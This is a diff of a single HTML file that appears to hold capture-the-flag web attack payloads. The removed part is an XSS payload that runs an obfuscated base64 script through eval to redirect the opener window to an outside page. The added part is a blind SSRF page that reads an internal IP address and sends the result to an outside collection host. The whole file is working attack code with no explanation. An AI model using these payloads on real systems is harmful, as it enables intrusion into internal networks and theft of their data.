@@ -1,3 +1,24 @@
-<script>
-window.location.href = `http://web:8080/bot?url=http://%22%22http://%3Cscript%3Evar ha = "c2V0SW50ZXJ2YWwoKCkgPT4geyB3aW5kb3cub3BlbmVyICYmIHdpbmRvdy5vcGVuZXIubG9jYXRpb24uaHJlZi5pbmNsdWRlcygnaW5kZXguaHRtbCcpICYmICh3aW5kb3cub3BlbmVyLmxvY2F0aW9uLmhyZWYgPSAnaHR0cHM6Ly9kMXgwcmhrNS5naXRodWIuaW8vd2ViX3Rlc3QvdGVzdDEuaHRtbCcpOyB9LCA1MDApOw==";var newWin = window.open('http://web:8080/bot?url=http://""http://<img src=x onerror="eval(atob(%5C%27'%2b ha%2b '%5C%27));">');%3C/script%3E`
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Blind SSRF via HTML</title>
+</head>
+<body>
+  <h1>Attempting internal fetch...</h1>
+
+  <script>
+    fetch("http://192.168.200.120:808")
+      .then(res => res.text())
+      .then(data => {
+        fetch("https://womjccv.request.dreamhack.games", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ data: data })
+        });
+      })
+      .catch(err => {
+        console.error("Internal fetch failed:", err);
+      });
+  </script>
+</body>
+</html>
